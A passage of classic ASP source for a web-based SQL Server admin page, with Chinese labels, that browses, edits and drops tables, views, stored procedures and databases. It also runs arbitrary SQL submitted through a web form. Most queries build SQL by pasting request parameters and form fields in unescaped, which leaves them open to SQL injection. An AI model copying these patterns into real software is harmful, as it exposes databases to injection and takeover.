		strmsg = strmsg & "<a href='?action=deletefield&confirm=yes&table=" & sTable & "&field="&sField&"'>Yes - 删除这个字段</a><BR><BR>"
		strmsg = strmsg & "<a href='?action=edittb&table="& sTable &"'>No - 不要删除这个字段</a>"
		ShowMessageBox(strmsg)
	end if
End Sub
Sub SQLExecutor(sQuery)
	if sQuery = "" then exit sub
	dim intRecordsAffected	, objField
    set RS = Conn.Execute(cstr(sQuery),intRecordsAffected)
    if intRecordsAffected < 0 Then
	   RS.MoveFirst
	   Response.write ("<center>" & _
	   	"<div class=""JJ"" style=""height:450px;"" align=center>" & _
		"<p>" & intRecordsAffected & " records affected!</P>" & _
	    "<table id=Result border=0 CELLSPACING=1 bgcolor=#CCCCCC CELLPADDING=4 width=90% cols=" & RS.Fields.Count & ">" & _
		"<tr align=center bgcolor=#F2F2F2>")
	   for each objField in RS.Fields
	   Response.write "<Th nowrap>" & objField.Name & "</th>"
	   Next
	   Response.write "</tr>"
	   Do while NOT RS.EOF
			Response.write ("<TBODY>" & _ 
			 "<tr bgcolor=#FFFFFF>")
			For each objField in RS.Fields
				Response.write "<td nowrap>"
				if IsNull(objField) Then
				Response.Write("&nbsp;")
				End if
				if	mid(objField.Value, 1, 4) = "http" then
				Response.Write "<a href=" & objField.Value & ">" & objField.Value & "</a>"
				else
				Response.Write (objField.Value)
				end if
				Response.write "</td>"
			Next
			RS.MoveNext 
			Response.write "</tr>"
			Response.write "</TBODY>"
		loop
		Response.write ("</table>" & _
		 "</div>" & _
		 "</center>" & _
		 "<br>")
    End If	   
End Sub
Sub ListRecords
	OpenDB 
	sSQL = "Select * from " & sTable & " "
	Set Rs = Conn.Execute(sSQL)
	Response.Write ("<br><TABLE width='650px' align=center BORDER=0 CELLPADDING=4 CELLSPACING=1 WIDTH=100% BGCOLOR=#CCCCCC>" & _
	"<tr width=70% bgcolor=#F2F2F2><td>Table: <strong>"& sTable &"</strong></td>" & _
	"<td width=30% align=right><a href=""?action=edittb&table=" & sTable & """>查看表结构</a> | <a href=""?action=addrec&table=" & sTable & """>增加新记录</a>"	 & _
	"</td></tr></table><br>" & _
	"<center>" & _
	"<div class=""JJ"" style=""height:450px;"" align=center>" & _
	"<TABLE BORDER=0 CELLPADDING=4 CELLSPACING=1 WIDTH=100% BGCOLOR=#CCCCCC>" & _
	"<TR bgcolor=#F2F2F2>" & _
	"<TD ALIGN=""Left"" vAlign=""top"">删除</TD>")
	For i = 0 to rs.fields.count - 1
	Response.Write("<TD ALIGN=""Left"" nowrap>" & Rs.Fields(i).name & "</TD>")
	next
	Response.Write "</TR>"
	do while not rs.eof
	Response.Write "<TR>"
		For i = 0 to rs.fields.count - 1
			if i = 0 then 
				Response.Write "<TD ALIGN=""Left"" bgcolor=""#FFFFFF"" nowrap><a href='?action=delrec&table=" & sTable & "&field="&Rs.Fields(i).name&"&id=" & rs.fields(0).value & "'>删除</a></TD>"
				Response.Write "<TD ALIGN=""Left"" bgcolor=""#FFFFFF"" nowrap><a href='?action=editrec&table=" & sTable & "&field="&Rs.Fields(i).name&"&id=" & rs.fields(0).value & "'>修改 #" & rs.fields(0).value & "</a></TD>"
			else 
				Response.Write "<TD ALIGN=""Left""  bgcolor=""#FFFFFF"" nowrap>" & Rs.Fields(i).value & "</TD>"
			end if
		next
	Response.Write "</TR>"
	rs.movenext
	loop
	Response.Write ("</TABLE>" & _
	 "</div>" & _
	"</center>"	)
	CloseDB
End Sub
Sub UpdateRecord
    sSQL = "UPDATE " & sTable & " SET "
	OpenDB
	set Rs = Conn.execute("Select top 1 * from " & sTable & "") 
	For i = 1 to rs.fields.count - 1
		sSQL = sSQL & rs.fields(i).name & "= '" & Request.Form(rs.fields(i).name) & "' "
		if i < rs.fields.count - 1 then sSQL = sSQL & ", "
	next
	sSQL = sSQL & " where ("&sField&"=" & intID & ")"
	Conn.execute(sSQL)
	response.Write("成功保存数据<br><br>")
	WriteLink "?action=listrec&field="&sField&"&table=" & sTable,"点击这里继续","<BR>"
	CloseDB
End Sub
Sub AddRecord
	dim strField, strValue
	strField = ""
	strValue = ""
	OpenDB
	Set Rs = Conn.Execute("Select top 1 * from " & sTable & "")
	For i = 1 to rs.fields.count - 1
		strField = strField & rs.fields(i).name 
		strValue = strValue & "'" & Request.Form(rs.fields(i).name) & "' "
		if i < rs.fields.count - 1 then 
		   strField = strField & ", "
		   strValue = strValue & ", "
		end if
	next
	sSQL = "INSERT INTO " & sTable & " " & "( " & strField & " ) VALUES " & " ("& strValue &") "
	response.Write("执行的SQL语句为：<br>" & sSQL)
	Conn.execute(sSQL)
	response.Write("<br><br>成功添加数据<br><br>")
	WriteLink "?action=listrec&field="&sField&"&table=" & sTable,"点击这里继续","<BR>"
	CloseDB
End Sub
Sub EditRecords()
	if sField <> "" then
		sSQL = "Select * from " & sTable & " where ("&sField&" = " & intID & ") "
		sAction="updaterec"
    else
		sSQL = "Select top 1 * from " & sTable 
		sAction="addrec"
	end if
	OpenDB
	set Rs = conn.execute(sSQL)
	Response.Write (" " & _
	"<FORM METHOD=POST ACTION='?action=" & sAction & "&table=" & sTable & "&field=" & sField & "'>" & _
	"<TABLE width=""90%"" BORDER=""0"" CELLPADDING=""4"" CELLSPACING=""1"" BGCOLOR=""#CCCCCC"" align=center>" & _
	"<TR><TD colspan="""& rs.fields.count &""" bgcolor=""#F2F2F2""><strong>添加修改记录</strong></TD></TR>")
	For i = 0 to rs.fields.count - 1
	Response.Write( "" & _
	"<TR>" & _
	"<TD ALIGN=""Left"" bgcolor=""#FFFFFF""><B>" & Rs.Fields(i).name & "</B></TD>" & _
	"<TD ALIGN=""Left"" bgcolor=""#F2F2F2"">" & Rs.Fields(i).type & "</TD>" & _
	"<TD ALIGN=""Left"" bgcolor=""#F2F2F2"">")
	WriteType i 
	Response.Write "</TD></TR>"
	next
	Response.Write ("</TABLE>" & _
	 "<TABLE width=""90%"" align=center BORDER=0 CELLPADDING=3 CELLSPACING=0>" & _
	 "<TR>" & _
	 "<TD ALIGN=""Left""><input name=submit type=submit value="" 确 定 "">" & _
	 "&nbsp;&nbsp;<input name=reset type=reset value="" 重 置 "">" & _
	 "&nbsp;&nbsp;<input name=cancel type=button value="" 取 消 "" onClick=""window.history.back()""></TD>" & _
	 "</TR>" & _
	 "</TABLE>"	 & _
	 "</FORM>")
	CloseDB
End Sub
Sub DeleteRecords
	if lcase(Request("confirm")) = "yes" then
		OpenDB
		sSQL = "DELETE FROM " & sTable & " where ("&sField&"=" & intID & ")"
		Conn.execute(sSQL)
		ShowMessageBox("删除成功。<br><br><a href='?action=listrec&table=" & sTable & "'>点击这里继续</a>")
		CloseDB
	else
		strmsg = "删除前请确认...<BR><BR>"
		strmsg = strmsg & "<a href='?action=delrec&confirm=yes&table=" & sTable & "&field="&sField&"&id=" & intID & "'>Yes - 删除这笔记录</a><BR><BR>"
		strmsg = strmsg & "<a href='?action=listrec&table="& sTable &"'>No - 不要删除这笔记录</a>"
		ShowMessageBox(strmsg)
	end if
End Sub
Sub ListViews
	OpenDB
	sSQL = "select sysobjects.id,sysobjects.name,sysobjects.category,sysusers.name,sysobjects.crdate "
	sSQL = sSQL & "from sysobjects join sysusers on sysobjects.uid = sysusers.uid "
	sSQL = sSQL & "where sysobjects.xtype = 'V' order by sysobjects.category,sysobjects.name "
	Set RS = Conn.execute(sSQL)
	dim myView
	Response.write ("<br>" & _
	 "<TABLE width=98% BORDER=0 align=center CELLPADDING=3 CELLSPACING=1 BGCOLOR=#cccccc>" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "<TD ALIGN=""Left"" colspan=""5"">["& DbName & "]的视图清单</TD>" & _
	 "</TR>" & _
	 "<TR>" & _
	 "<TD width=50% ALIGN=Left bgcolor=#F2F2F2><strong>视图名称</strong></TD>" & _
	 "<TD width=10% ALIGN=Left bgcolor=#F2F2F2><strong>所有者</strong></TD>" & _
	 "<TD width=8% ALIGN=Left bgcolor=#F2F2F2><strong>类型</strong></TD>" & _
	 "<TD width=19% ALIGN=Left bgcolor=#F2F2F2><strong>创建日期</strong></TD>" & _
	 "<TD width=13% ALIGN=center bgcolor=#F2F2F2><strong>操作</strong></TD>" & _
	 "</TR>")
	Do until RS.EOF
	myView = "["&DbName&"].["&RS(3)&"].["&RS(1)&"]"
	Response.write ("  <TR bgcolor=#FFFFFF>" & _
	 "<TD ALIGN=Left><a href=""?action=showvw&view=" & myView & """>" & RS(1) & "</a> (ID "& RS(0) &")"  & _
	 "</TD>" & _
	 "<TD ALIGN=Left>" & RS(3) & "</TD>" & _
	 "<TD ALIGN=Left>")
	if RS(2)=0 then response.Write("用户") else response.Write("系统") 
	Response.write ("</TD>" & _
	 "	<TD ALIGN=Left>" & RS(4) & "</TD>" & _
	 "	<TD ALIGN=center><a href=""?action=editvw&view=" & myView & """>编辑</a> | <a href=""?action=delvw&view=" & "["&RS(3)&"].["&RS(1)&"]" & """>删除</a>"  & _
	 "    </TD>" & _
	 "  </TR>")
	RS.movenext
	Loop  
	Response.write "</TABLE>"
	CloseDB
end Sub
Sub EditViews   
	sSQL = "select b.name,c.name,c.xtype,b.length,b.isnullable,b.status,b.colid from sysobjects a "
	sSQL = sSQL & "join syscolumns b on a.id = b.id "
	sSQL = sSQL & "join systypes c on b.xtype = c.xtype and c.usertype <> 18 "
	sSQL = sSQL & "where a.id = Object_ID('"& sView &"') order by b.colid"
	OpenDB
	Dim viewtext
	viewtext = txt2html(GetObjectText(DbName,sView))
	Response.Write ("<br>" & _
	 "<TABLE WIDTH=""90%"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" BGCOLOR=""#CCCCCC"">" & _
	 "<TR><TD bgcolor=""#FFFFFF""><a href='?action=listvw'>返回视图清单</a></TD></TR>" & _
	 "<TR><TD bgcolor=""#F1F1F1""><strong>视图 "& sView &" 的内容</strong></TD></TR>" & _
	 "<TR><TD bgcolor=""#FFFFFF"">"& viewtext &"</TD></TR>" & _
	 "<TR><TD bgcolor=""#FFFFFF""><input value="" 修  改 "" name=""UpView"" type=""button"" onclick=""window.location.href='?action=updatevw&view="&sView&"'""></TD></TR>" & _
	 "</TABLE>")
	Set RS = Conn.Execute(sSQL)
	Response.Write ("<BR>" & _
	 "<TABLE WIDTH=""90%"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" BGCOLOR=""#CCCCCC"">" & _
	 "<TR><TD colspan=""5"" bgcolor=""#FFFFFF""><a href='?action=listvw'>返回视图清单</a></TD></TR>" & _
	 "<TR bgcolor=""#F2F2F2"">" & _
	 "	<TD ALIGN=""Left""><strong>字段名</strong></TD>" & _
	 "	<TD ALIGN=""Left""><strong>数据类型</strong></TD>" & _
	 "	<TD ALIGN=""Left""><strong>长度</strong></TD>" & _
	 "	<TD ALIGN=""Left""><strong>允许空</strong></TD>" & _
	 "	<TD ALIGN=""Left""><strong>标识列</strong></TD>" & _
	 "</TR>")
	Do until RS.EOF
	Response.Write ("<TR bgcolor=""#FFFFFF"" ALIGN=""Left"">" & _
	 "	<TD>" & RS(0) & "</TD>" & _
	 "	<TD>" & RS(1) & "</TD>" & _
	 "	<TD>" & RS(3) & "</TD>"		 & _
	 "	<TD>")
	if RS(4) = 0 then Response.Write "False" else Response.Write "True" 
	Response.Write "    </TD><TD>"
	if RS(5) = 128 then Response.write "True" else Response.Write "False" 
	Response.Write "</TD></TR>"
	Rs.movenext
	Loop
	Response.Write "</TABLE><br>"
	CloseDB
End Sub
Sub ShowViews()
	OpenDB 
	sSQL = "Select  * from " & sView & " "
	Set Rs = Conn.Execute(sSQL)
	Response.Write ("<br>" & _
	 "<TABLE width='650px' align=center BORDER=0 CELLPADDING=4 CELLSPACING=1 WIDTH=100% BGCOLOR=#CCCCCC>" & _
	 "<tr width=80% bgcolor=#F2F2F2><td><strong>Views: "& sView &"</strong> </td>" & _
	 "<td width=20% align=right><a href=""?action=editvw&view=" & sView & """>查看视图结构</a>"	 & _
	 "</td></tr></table><br>" & _
	 "<center>" & _
	 "<div class=""JJ"" style=""height:450px;"" align=center>" & _
	 "<TABLE BORDER=0 CELLPADDING=4 CELLSPACING=1 WIDTH=100% BGCOLOR=#CCCCCC>" & _
	 "<TR bgcolor=#F2F2F2>")
	For i = 0 to rs.fields.count - 1
	Response.Write("<TD ALIGN=""Left"" nowrap>" & Rs.Fields(i).name & "</TD></TR>")
	next
	do while not rs.eof
	Response.Write "<TR>"
	For i = 0 to rs.fields.count - 1
		Response.Write "<TD ALIGN=""Left""  bgcolor=""#FFFFFF"" nowrap>" & Rs.Fields(i).value & "</TD></TR>"
	next
	rs.movenext
	loop
	Response.Write "</TABLE></div></center>"
	CloseDB
End Sub
Sub DeleteViews
    if lcase(Request("confirm")) = "yes" then
		if sView = "" then
			Response.Write("没有输入视图名称")
		else
			on error resume next
			OpenDB
			Conn.execute "USE [" & DbName & "];"
			Conn.Execute "DROP VIEW " & sView
			if err.number <> 0 then
				ShowMessageBox("删除时发生错误。<BR><BR>错误描述: " & Err.Description) 
			Else
				ShowMessageBox("成功删除视图：" & sView & "<BR><BR><a href='?action=listvw'>点击这里继续</a>") 
			end if
			err.clear
			CloseDB
		end if
	else
		strmsg = "删除前请确认...<BR><BR>"
		strmsg = strmsg & "<a href='?action=delvw&confirm=yes&view=" & sView & "'>Yes - 删除这个视图</a><BR><BR>"
		strmsg = strmsg & "<a href='?action=listvw'>No - 不要删除这个视图</a>"
		ShowMessageBox(strmsg)
	end if
End Sub
Sub UpdateViews()
	OpenDB
	Dim viewtext, strVIew
	strView = Trim(Request.Form("txtView"))
	if strView = "" then
		viewtext = GetObjectText(DbName,sView)
		if instr(viewtext,"create") > 0 then
		viewtext = Replace(viewtext,"create","ALTER")
		elseif instr(viewtext,"CREATE") > 0 then
		viewtext = Replace(viewtext,"CREATE","ALTER")
		end if
		Response.Write ("<br>" & _
		 "<TABLE WIDTH=""90%"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" BGCOLOR=""#CCCCCC"">" & _
		 "<form name='viewform' action='?action=updatevw' method='post'>" & _
		 "<TR><TD bgcolor=""#FFFFFF""><a href='?action=listvw'>返回视图清单</a></TD></TR>" & _
		 "<TR><TD bgcolor=""#F1F1F1""><strong>视图 "& sView &" 的内容</strong></TD></TR>" & _
		 "<TR><TD bgcolor=""#FFFFFF""><textarea ROWS=20 style='width:100%' name=""txtView"">"& viewtext &"</textarea></TD></TR>" & _
		 "<TR><TD bgcolor=""#FFFFFF""><input value="" 保  存 "" name=""UpView"" type=""submit"">" & _
		 "&nbsp;&nbsp;&nbsp;<input value="" 重  置 "" name=""Reset"" type=""reset"">" & _
		 "&nbsp;&nbsp;&nbsp;<input value="" 取  消 "" name=""Cancel"" type=""button"" onclick=""window.location.href='?action=listvw'"">" & _
		 "</TD></TR></form></TABLE>")
	else
		On Error Resume Next
		Conn.execute(strView)
		if err.number<> 0 then
		   ShowMessageBox("修改视图时发生错误：" & Err.Description)
		else 
		   ShowMessageBox("成功修改视图！<br><br><a href='?action=listvw'>点击这里返回</a>")
		end if
		err.clear
	end if
	CloseDB
End Sub
Sub ListStoredProcedure()
	OpenDB
	sSQL = "select sysobjects.id,sysobjects.name,sysobjects.category,sysusers.name,sysobjects.crdate "
	sSQL = sSQL & "from sysobjects join sysusers on sysobjects.uid = sysusers.uid "
	sSQL = sSQL & "where sysobjects.xtype = 'P' and sysobjects.category = 0 order by sysobjects.category,sysobjects.name "
	Set RS = Conn.execute(sSQL)
	dim myView
	Response.write ("<br>" & _
	 "<TABLE width=98% BORDER=0 align=center CELLPADDING=3 CELLSPACING=1 BGCOLOR=#cccccc>" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "<TD ALIGN=""Left"" colspan=""5"">["& DbName & "]的存储过程清单</TD>" & _
	 "</TR>" & _
	 "  <TR>" & _
	 "	<TD width=50% ALIGN=Left bgcolor=#F2F2F2><strong>存储过程名称</strong></TD>" & _
	 "	<TD width=10% ALIGN=Left bgcolor=#F2F2F2><strong>所有者</strong></TD>" & _
	 "	<TD width=8% ALIGN=Left bgcolor=#F2F2F2><strong>类型</strong></TD>" & _
	 "	<TD width=19% ALIGN=Left bgcolor=#F2F2F2><strong>创建日期</strong></TD>" & _
	 "	<TD width=13% ALIGN=center bgcolor=#F2F2F2><strong>操作</strong></TD>" & _
	 "  </TR>")
	Do until RS.EOF
	myView = "["&DbName&"].["&RS(3)&"].["&RS(1)&"]"
	Response.Write( "" & _
	 "  <TR bgcolor=#FFFFFF>" & _
	 "	<TD ALIGN=Left><a href=""?action=showsp&sp=" & myView & """>" & RS(1) & "</a> (ID "& RS(0) &")</TD>" & _
	 "	<TD ALIGN=Left>" & RS(3) & "</TD>" & _
	 "	<TD ALIGN=Left>")
	if RS(2)=0 then response.Write("用户") else response.Write("系统") 
	Response.write ("</TD>" & _
	 "	<TD ALIGN=Left>" & RS(4) & "</TD>" & _
	 "	<TD ALIGN=center><a href=""?action=editsp&sp=" & myView & ">编辑</a> | <a href=""?action=delsp&sp=" & "["&RS(3)&"].["&RS(1)&"]" & """>删除</a>"  & _
	 "    </TD>" & _
	 "  </TR>")
	RS.movenext
	Loop  
	Response.write "</TABLE><br>"
	CloseDB
End Sub
Sub ViewStoredProcedure()
	sSQL = "select a.name,c.name,a.xtype,a.length,a.isoutparam from syscolumns a "
	sSQL = sSQL & "join sysobjects b on a.id = b.id "
	sSQL = sSQL & "join systypes c on a.xtype = c.xtype "
	sSQL = sSQL & "where b.id = object_id('" & sSP & "') order by a.colid "
	OpenDB
	Set RS = Conn.execute(sSQL)
	Response.Write ("<BR>" & _
	 "<TABLE WIDTH=""90%"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" BGCOLOR=""#CCCCCC"">" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "	<TD ALIGN=""Left"" colspan=""4""><a href=""?action=listsp"">返回存储过程清单</a>" & _
	 "</TD></TR>" & _
	 "<TR bgcolor=""#F1F1F1"">" & _
	 "	<TD ALIGN=""Left"" colspan=""4"">存储过程 "& sSP &" 的参数内容</TD>" & _
	 "</TR>" & _
	 "<TR bgcolor=""#F2F2F2"" ALIGN=""Left"">" & _
	 "	<TD><strong>参数名称</strong></TD>" & _
	 "	<TD><strong>数据类型</strong></TD>" & _
	 "	<TD><strong>长度</strong></TD>" & _
	 "	<TD><strong>是否输出参数</strong></TD>" & _
	 "</TR>")
	Do until RS.EOF
	Response.Write ("<TR bgcolor=""#FFFFFF"" ALIGN=""Left"">" & _
	 "	<TD>" & RS(0) & "</TD>" & _
	 "	<TD>" & RS(1) & "</TD>" & _
	 "	<TD>" & RS(3) & "</TD>" & _
	 "	<TD>" & RS(4) & "</TD>"	 & _
	 "</TR>")
	Rs.movenext
	Loop
	Response.Write "</TABLE>"
	Dim sptext
	sptext = txt2html(GetObjectText(DbName,sSP))
	Response.Write ("<br><TABLE WIDTH=""90%"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" BGCOLOR=""#CCCCCC"">" & _
	 "<TR><TD bgcolor=""#FFFFFF""><a href='?action=listsp'>返回存储过程清单</a> | <a href='?action=editsp&sp="&sSP&"'>修改该存储过程</a> </TD></TR>" & _
	 "<TR><TD bgcolor=""#F1F1F1""><strong>存储过程 "& sSP &" 的内容</strong></TD></TR>" & _
	 "<TR><TD bgcolor=""#FFFFFF"">"& sptext &"</TD></TR>" & _
	 "</TABLE><br>")
	CloseDB
End Sub
Sub EditStoredProcedure()
	OpenDB
	Dim sptext, strSP
	strSP = Trim(Request.Form("txtSP"))
	if strSP = "" then
		sptext = GetObjectText(DbName,sSP)
		if instr(sptext,"create") > 0 then
		sptext = Replace(sptext,"create","ALTER")
		elseif instr(sptext,"CREATE") > 0 then
		sptext = Replace(sptext,"CREATE","ALTER")
		end if
		Response.Write ("<br>" & _
		 "<TABLE WIDTH=""95%"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" BGCOLOR=""#CCCCCC"">" & _
		 "<form name='spform' action='?action=editsp' method='post'>" & _
		 "<TR><TD bgcolor=""#FFFFFF""><a href='?action=listsp'>返回存储过程清单</a></TD></TR>" & _
		 "<TR><TD bgcolor=""#F1F1F1""><strong>编辑存储过程 "& sSP &" 的内容</strong></TD></TR>" & _
		 "<TR><TD bgcolor=""#FFFFFF""><textarea ROWS=30 style='width:100%' name=""txtSP"">"& sptext &"</textarea></TD></TR>" & _
		 "<TR><TD bgcolor=""#FFFFFF""><input value="" 保  存 "" name=""UpSP"" type=""submit"">" & _
		 "&nbsp;&nbsp;&nbsp;<input value="" 重  置 "" name=""Reset"" type=""reset"">" & _
		 "&nbsp;&nbsp;&nbsp;<input value="" 取  消 "" name=""Cancel"" type=""button"" onclick=""window.location.href='?action=listsp'"">" & _
		 "</TD></TR></form></TABLE>")
	else
		On Error Resume Next
		Conn.execute(strSP)
		if err.number<> 0 then
		   ShowMessageBox("修改存储过程时发生错误：" & Err.Description)
		else 
		   ShowMessageBox("成功修改存储过程！<br><br><a href='?action=listsp'>点击这里返回</a>")
		end if
		err.clear
	end if
	CloseDB
End Sub
Sub DeleteStoredProcedure()
    if lcase(Request("confirm")) = "yes" then
		if sSP = "" then
			Response.Write("没有输入存储过程名称")
		else
			on error resume next
			OpenDB
			Conn.execute "USE [" & DbName & "];"
			Conn.Execute "DROP PROCEDURE " & sSP
			if err.number <> 0 then
				ShowMessageBox("删除时发生错误。<BR><BR>错误描述: " & Err.Description) 
			Else
				ShowMessageBox("成功删除存储过程：" & sSP & "<BR><BR><a href='?action=listsp'>点击这里继续</a>") 
			end if
			err.clear
			CloseDB
		end if
	else
		strmsg = "删除前请确认...<BR><BR>"
		strmsg = strmsg & "<a href='?action=delsp&confirm=yes&sp=" & sSP & "'>Yes - 删除这个存储过程</a><BR><BR>"
		strmsg = strmsg & "<a href='?action=listsp'>No - 不要删除这个存储过程</a>"
		ShowMessageBox(strmsg)
	end if
End Sub
Sub ListDatabase()
	if Request.Form("ShowSysDB") = "yes" then
	sSQL = "SELECT name FROM master.dbo.sysdatabases WHERE has_dbaccess(name) = 1 ORDER BY name "
	Else
	sSQL = "SELECT name FROM master.dbo.sysdatabases WHERE has_dbaccess(name) = 1 AND name NOT IN ('master', 'tempdb', 'msdb', 'model') ORDER BY name "
	end if
	OpenDB
	Set Rs = Conn.execute(sSQL)
	if not rs.eof then
		Response.write ("<br>" & _
		"<TABLE width=90% BORDER=0 align=center CELLPADDING=3 CELLSPACING=1 BGCOLOR=#cccccc>" & _
		 "<form action='?action=listdb' method='post' name='dbform'>" & _
		 "<TR bgcolor=""#FFFFFF"">" & _
		 " <TD ALIGN=""Left"" colspan=""5"">["& DbServer & "] 的数据库清单</TD>" & _
		 "</TR>"& _
		 "<TR>" & _
		 " <TD bgcolor=#F2F2F2><strong>数据库名称</strong></TD>" & _
		 "</TR>")
		Do until RS.EOF
		Response.write ("<TR bgcolor=#FFFFFF>" & _
		 "	<TD ALIGN=Left><a href='?action=showdb&db="&rs(0)&"'>"& Rs(0) &"</a></TD>" & _
		 "  </TR>")
		RS.movenext
		Loop  
		Response.Write ("</TR>" & _
		"<TR>" & _
		"<TD bgcolor=#F2F2F2><input name=ShowSysDB ")
		if Request.Form("ShowSysDB") = "yes" then Response.write "checked "
		Response.write ("type=checkbox value='yes'>显示系统数据库" & _
		 "<input type=submit name=submit value=确定></TD>" & _
		 "</TR>" & _
		 "</form>"  & _
		 "</TABLE><br>")
    End If
	CloseDB
End Sub
Sub ShowDatabaseInfo()
	sSQL = "SELECT t1.owner, t1.crdate, t1.size, t2.DBBupDate, t3.DifBupDate, t4.JournalBupDate FROM "
	sSQL = sSQL & "(SELECT d.name, suser_sname(d.sid) AS owner, d.crdate, "
	sSQL = sSQL & "(SELECT STR(SUM(CONVERT(DEC(15), f.size)) * (SELECT v.low FROM master.dbo.spt_values v WHERE v.type = 'E' AND v.number = 1) / 1048576, 10, 2) + 'MB' "
	sSQL = sSQL & "FROM [" & remquote(sDB) & "].dbo.sysfiles f) AS size "
	sSQL = sSQL & "FROM master.dbo.sysdatabases d "
	sSQL = sSQL & "WHERE d.name = '" & remquote(sDB) & "') AS t1 "
	sSQL = sSQL & "LEFT JOIN (SELECT '" & remquote(sDB) & "' AS name, MAX(backup_finish_date) AS DBBupDate "
	sSQL = sSQL & "FROM msdb.dbo.backupset WHERE type = 'D' AND database_name = '" & remquote(sDB) & "') AS t2 ON t1.name = t2.name "
	sSQL = sSQL & "LEFT JOIN (SELECT '" & remquote(sDB) & "' AS name, MAX(backup_finish_date) AS DifBupDate FROM msdb.dbo.backupset "
	sSQL = sSQL & "WHERE type = 'I' AND database_name = '" & remquote(sDB) & "') AS t3 ON t1.name = t3.name "
	sSQL = sSQL & "LEFT JOIN (SELECT '" & remquote(sDB) & "' AS name, MAX(backup_finish_date) AS JournalBupDate "
	sSQL = sSQL & "FROM msdb.dbo.backupset WHERE type = 'L' AND database_name = '" & remquote(sDB) & "') AS t4 ON t1.name = t4.name "
	OpenDB
	dim strbody
	Set Rs = Conn.Execute(sSQL)
	if not Rs.eof then
		strbody = "<br><TABLE width=90% BORDER=0 align=center CELLPADDING=3 CELLSPACING=1 BGCOLOR=#cccccc>"
		strbody = strbody & "<TR><TD bgcolor=#FFFFFF colspan=2><a href='?action=listdb'>返回数据库清单</a></TD></TR>"
		strbody = strbody & "<TR><TD bgcolor=#F2F2F2 colspan=2><strong>["& sDB &"] 的基本资料</strong></TD></TR>"
		while not rs.eof 
		strbody = strbody & "<TR><TD bgcolor=#FFFFFF width='25%'>所有者：</TD><TD bgcolor=#FFFFFF width='75%'>"& Rs(0) &"</TD></TR>"
		strbody = strbody & "<TR><TD bgcolor=#FFFFFF>创建日期：</TD><TD bgcolor=#FFFFFF>"& Rs(1) &"</TD></TR>"
		strbody = strbody & "<TR><TD bgcolor=#FFFFFF>大小：</TD><TD bgcolor=#FFFFFF>"& Rs(2) &"</TD></TR>"
		strbody = strbody & "<TR><TD bgcolor=#FFFFFF>上次数据库备份：</TD><TD bgcolor=#FFFFFF>"& Rs(3) &"</TD></TR>"
		strbody = strbody & "<TR><TD bgcolor=#FFFFFF>上次差异备份：</TD><TD bgcolor=#FFFFFF>"& Rs(4) &"</TD></TR>"
		strbody = strbody & "<TR><TD bgcolor=#FFFFFF>上次事务日志备份：</TD><TD bgcolor=#FFFFFF>"& Rs(5) &"</TD></TR>"
		rs.movenext
		wend
		strbody = strbody & "</TABLE>"
		response.Write(strbody)
	end if
	rs.close
	Conn.execute "USE [" & rembracket(sDB) & "];"
	set rs = Conn.execute("EXEC sp_helpfile")
	if not rs.eof then
		strbody = "<br><TABLE width=90% BORDER=0 align=center CELLPADDING=3 CELLSPACING=1 BGCOLOR=#cccccc>"
		strbody = strbody & "<TR><TD bgcolor=#F2F2F2 colspan=2><strong>["& sDB &"] 的数据库文件</strong></TD></TR>"
		while not rs.eof 
		strbody = strbody & "<TR><TD bgcolor=#FEFEFE colspan=2>"&Rs(0)&"</TD></TR>"
		strbody = strbody & "<TR><TD align=right bgcolor=#FFFFFF width='25%'>文件名称：</TD><TD bgcolor=#FFFFFF width='75%'>"& Rs(2) &"</TD></TR>"
		strbody = strbody & "<TR><TD align=right bgcolor=#FFFFFF>文件组：</TD><TD bgcolor=#FFFFFF>"& Rs(3) &"</TD></TR>"
		strbody = strbody & "<TR><TD align=right bgcolor=#FFFFFF>大小：</TD><TD bgcolor=#FFFFFF>"& Rs(4) &"</TD></TR>"
		strbody = strbody & "<TR><TD align=right bgcolor=#FFFFFF>最大文件大小：</TD><TD bgcolor=#FFFFFF>"& Rs(5) &"</TD></TR>"
		strbody = strbody & "<TR><TD align=right bgcolor=#FFFFFF>文件的增量：</TD><TD bgcolor=#FFFFFF>"& Rs(6) &"</TD></TR>"
		strbody = strbody & "<TR><TD align=right bgcolor=#FFFFFF>文件用法：</TD><TD bgcolor=#FFFFFF>"& Rs(7) &"</TD></TR>"
		rs.movenext
		wend
		strbody = strbody & "</TABLE><br>"
		response.Write(strbody)
	end if
	CloseDB
End Sub
Sub ExecSQL()
    sSQL = Trim(Request.Form("sql"))
	strQueryPlan = Request.Form("query_plan")
	Response.Write("<br>" & _
	 "<TABLE width=""95%"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" bgcolor=""#CCCCCC"">" & _
	 "<FORM METHOD=""POST"" ACTION=""?action=execsql"" name=sqlform>" & _
	 "<TR>" & _
	 " <TD ALIGN=""Left"" bgcolor=""#F2F2F2""><strong>请输入SQL语句</strong> －－ 语句前有单引号[']的只会显示而不执行</TD>" & _
	 "</TR>" & _
	 "<TR>" & _
	 " <TD ALIGN=""Left"" bgcolor=""#FFFFFF"">" & _
	 "<select name=""spName"" size=""1"" onchange=""if(this.options[this.selectedIndex].value!=''){document.sqlform.sql.value=this.options[this.selectedIndex].value;}"">" & _
	 "<option value=""sp_who2"">常用扩展过程</option>" & _
	 "<option value=""SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BUSY AS 'CPU ms',@@IDLE AS 'Idle ms',@@IO_BUSY AS 'IO ms',@@MAX_CONNECTIONS as 'MAX CONNECTIONS',@@PACK_RECEIVED as 'PACK RECEIVED',@@PACK_SENT as 'PACK SENT',@@PACKET_ERRORS as 'PACKET ERRORS',@@TOTAL_ERRORS AS 'TOTAL_ERRORS',@@TOTAL_READ AS 'TOTAL_READ',@@TOTAL_WRITE AS '@@TOTAL_WRITE'"">Stats</option>" & _
	 "<option value=""exec sp_help"">sp_help</option>" & _
	 "<option value=""exec sp_helpdb"">sp_helpdb</option>" & _
